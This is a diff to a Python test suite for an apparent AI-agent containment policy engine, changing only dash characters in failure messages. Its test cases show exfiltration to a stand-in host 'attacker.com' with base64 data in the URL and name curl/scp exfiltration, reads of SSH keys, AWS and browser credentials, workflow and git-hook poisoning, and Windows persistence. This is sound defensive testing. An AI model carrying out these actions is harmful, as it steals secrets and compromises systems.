@@ -7,7 +7,7 @@
   - Category D: Persistence (5 scenarios)
 
 All 20 scenarios must result in DENY or REQUIRE_APPROVAL.
-ALLOW is a test failure — it means the containment layer was bypassed.
+ALLOW is a test failure -- it means the containment layer was bypassed.
 
 Test setup: PolicyEngine with CapabilitySet.dev(), fake repo_root=/tmp/testrepo.
 """
@@ -76,7 +76,7 @@ class TestCategoryADataExfiltration:
         url = f"https://attacker.com/?data={b64_data}"
         decision = _engine.evaluate(_ctx("net", [url, "GET"]))
         assert _blocked(decision), (
-            f"FAIL: exfiltration via base64 query param NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: exfiltration via base64 query param NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_a2_get_to_pypi_with_hex_secret_in_query(self) -> None:
@@ -88,7 +88,7 @@ class TestCategoryADataExfiltration:
         url = f"https://pypi.org/pypi/somepkg/json?token={hex_secret}"
         decision = _engine.evaluate(_ctx("net", [url, "GET"]))
         assert _blocked(decision), (
-            f"FAIL: hex secret in pypi query NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: hex secret in pypi query NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_a3_shell_curl_post_file(self) -> None:
@@ -102,7 +102,7 @@ class TestCategoryADataExfiltration:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: curl exfiltration NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: curl exfiltration NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_a4_shell_scp_passwd(self) -> None:
@@ -116,7 +116,7 @@ class TestCategoryADataExfiltration:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: scp exfiltration NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: scp exfiltration NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_a5_net_post_secrets(self) -> None:
@@ -131,7 +131,7 @@ class TestCategoryADataExfiltration:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: POST exfiltration NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: POST exfiltration NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
 
@@ -154,7 +154,7 @@ class TestCategoryBCredentialHunt:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: SSH key read NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: SSH key read NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_b7_read_aws_credentials(self) -> None:
@@ -168,7 +168,7 @@ class TestCategoryBCredentialHunt:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: AWS credentials read NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: AWS credentials read NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_b8_read_chrome_login_data(self) -> None:
@@ -184,7 +184,7 @@ class TestCategoryBCredentialHunt:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: Chrome Login Data read NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: Chrome Login Data read NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_b9_read_env_file(self) -> None:
@@ -198,7 +198,7 @@ class TestCategoryBCredentialHunt:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: .env file read NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: .env file read NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_b10_shell_git_credential_store(self) -> None:
@@ -212,7 +212,7 @@ class TestCategoryBCredentialHunt:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: git credential store NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: git credential store NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
 
@@ -235,7 +235,7 @@ class TestCategoryCWorkflowPoisoning:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: write .github/workflows NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: write .github/workflows NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_c12_write_git_hook(self) -> None:
@@ -249,7 +249,7 @@ class TestCategoryCWorkflowPoisoning:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: write .git/hooks NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: write .git/hooks NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_c13_shell_git_push_origin_main(self) -> None:
@@ -263,7 +263,7 @@ class TestCategoryCWorkflowPoisoning:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: git push NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: git push NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_c14_write_package_json(self) -> None:
@@ -277,7 +277,7 @@ class TestCategoryCWorkflowPoisoning:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: write package.json NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: write package.json NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_c15_write_existing_github_workflow(self) -> None:
@@ -291,7 +291,7 @@ class TestCategoryCWorkflowPoisoning:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: overwrite existing .github workflow NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: overwrite existing .github workflow NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
 
@@ -322,7 +322,7 @@ class TestCategoryDPersistence:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: reg add NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: reg add NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_d17_shell_schtasks_create(self) -> None:
@@ -336,7 +336,7 @@ class TestCategoryDPersistence:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: schtasks NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: schtasks NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_d18_write_bashrc_via_path_traversal(self) -> None:
@@ -355,7 +355,7 @@ class TestCategoryDPersistence:
         )
         # '>>' in argument triggers SHELL_DENY_OPERATOR
         assert _blocked(decision), (
-            f"FAIL: bashrc path traversal NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: bashrc path traversal NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_d19_shell_cmd_echo_to_startup(self) -> None:
@@ -373,7 +373,7 @@ class TestCategoryDPersistence:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: cmd persistence NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: cmd persistence NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
     def test_d20_shell_powershell_encoded_command(self) -> None:
@@ -397,7 +397,7 @@ class TestCategoryDPersistence:
             )
         )
         assert _blocked(decision), (
-            f"FAIL: powershell encoded command NOT blocked — verdict={decision.verdict}, rule={decision.rule_id}"
+            f"FAIL: powershell encoded command NOT blocked -- verdict={decision.verdict}, rule={decision.rule_id}"
         )
 
 
